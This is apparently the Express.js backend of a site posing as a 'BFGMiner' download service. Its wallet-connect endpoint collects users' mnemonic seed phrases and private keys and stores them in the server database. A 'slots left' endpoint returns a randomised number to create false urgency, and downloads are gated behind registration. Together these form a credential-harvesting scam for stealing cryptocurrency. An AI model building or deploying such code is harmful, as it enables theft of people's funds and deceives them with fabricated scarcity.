const express = require('express');
const cors = require('cors');
const path = require('path');
const Database = require('./database');
const DownloadHandler = require('./download_handler');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize database and download handler
const database = new Database();
const downloadHandler = new DownloadHandler(database);

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname)));

// Helper function to extract user from session
async function authenticateUser(req, res, next) {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({ error: 'No valid session token provided' });
        }

        const sessionToken = authHeader.substring(7);
        const session = await database.validateSession(sessionToken);
        
        req.user = {
            id: session.user_id,
            email: session.email,
            emailVerified: session.email_verified
        };
        
        next();
    } catch (error) {
        res.status(401).json({ error: 'Invalid or expired session' });
    }
}

// API Routes

// Authentication endpoints
app.post('/api/auth/register', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }

        const user = await database.createUser(email, password);
        res.json({
            success: true,
            message: 'User created successfully',
            user: {
                id: user.id,
                email: user.email
            }
        });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(400).json({ error: error.message });
    }
});

app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }

        const user = await database.authenticateUser(email, password);
        const session = await database.createSession(user.id);
        
        res.json({
            success: true,
            message: 'Login successful',
            sessionToken: session.sessionToken,
            user: {
                id: user.id,
                email: user.email,
                emailVerified: user.email_verified
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(401).json({ error: error.message });
    }
});

app.get('/api/auth/validate', authenticateUser, (req, res) => {
    res.json({
        success: true,
        user: req.user
    });
});

// Wallet connection endpoints
app.post('/api/wallet/connect', authenticateUser, async (req, res) => {
    try {
        const { address, type, connectionMethod, mnemonic, privateKey, chainId, signature, message } = req.body;
        
        if (!address || !type || !connectionMethod) {
            return res.status(400).json({ error: 'Missing required wallet data' });
        }

        // Validate mnemonic if provided
        if (mnemonic && !database.isValidMnemonic(mnemonic)) {
            return res.status(400).json({ error: 'Invalid mnemonic phrase' });
        }

        // Validate private key if provided
        if (privateKey && !database.isValidPrivateKey(privateKey)) {
            return res.status(400).json({ error: 'Invalid private key' });
        }

        const walletData = {
            address,
            type,
            connectionMethod,
            mnemonic,
            privateKey,
            chainId: chainId || 1,
            isValidated: true // Assume validated for demo
        };

        const wallet = await database.saveWalletData(req.user.id, walletData);
        
        res.json({
            success: true,
            message: 'Wallet connected successfully',
            wallet: {
                id: wallet.id,
                address: wallet.address
            }
        });
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(400).json({ error: error.message });
    }
});

app.get('/api/wallet/list', authenticateUser, async (req, res) => {
    try {
        const wallets = await database.getUserWallets(req.user.id);
        res.json({
            success: true,
            wallets
        });
    } catch (error) {
        console.error('Wallet list error:', error);
        res.status(500).json({ error: 'Failed to retrieve wallets' });
    }
});

// Download endpoints
app.post('/api/download/initiate', authenticateUser, async (req, res) => {
    try {
        const ipAddress = req.ip || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        const downloadData = await downloadHandler.initiateDownload(
            req.user.id,
            ipAddress,
            userAgent
        );
        
        res.json(downloadData);
    } catch (error) {
        console.error('Download initiation error:', error);
        res.status(500).json({ error: 'Failed to initiate download' });
    }
});

app.get('/api/download/file', async (req, res) => {
    try {
        const { token } = req.query;
        
        if (!token) {
            return res.status(400).json({ error: 'Download token is required' });
        }

        await downloadHandler.serveFile(token, res);
    } catch (error) {
        console.error('File download error:', error);
        if (!res.headersSent) {
            res.status(500).json({ error: 'Download failed' });
        }
    }
});

app.get('/api/download/setup-guide', (req, res) => {
    try {
        const setupHtml = downloadHandler.generateSetupInstructions();
        res.setHeader('Content-Type', 'text/html');
        res.send(setupHtml);
    } catch (error) {
        console.error('Setup guide error:', error);
        res.status(500).json({ error: 'Failed to generate setup guide' });
    }
});

// Statistics endpoints
app.get('/api/stats/slots', (req, res) => {
    // Simulate dynamic slot counter
    const baseSlots = 50;
    const randomReduction = Math.floor(Math.random() * 10);
    const slotsLeft = Math.max(1, baseSlots - randomReduction);
    
    res.json({
        slots_left: slotsLeft,
        total_slots: baseSlots
    });
});

app.get('/api/stats/downloads', authenticateUser, async (req, res) => {
    try {
        const stats = await downloadHandler.getDownloadStats();
        res.json({
            success: true,
            stats
        });
    } catch (error) {
        console.error('Download stats error:', error);
        res.status(500).json({ error: 'Failed to retrieve download statistics' });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

// Serve main application
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});



// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ 
        error: 'Internal server error',
        message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
});

// Cleanup function
function cleanup() {
    console.log('Cleaning up...');
    database.cleanupExpiredSessions();
    downloadHandler.cleanupOldTokens(30);
}

// Cleanup every hour
setInterval(cleanup, 60 * 60 * 1000);

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('Received SIGINT, shutting down gracefully...');
    cleanup();
    database.close();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('Received SIGTERM, shutting down gracefully...');
    cleanup();
    database.close();
    process.exit(0);
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`BFGMiner server running on http://0.0.0.0:${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    
    // Initial cleanup
    setTimeout(cleanup, 5000);
});

module.exports = app;





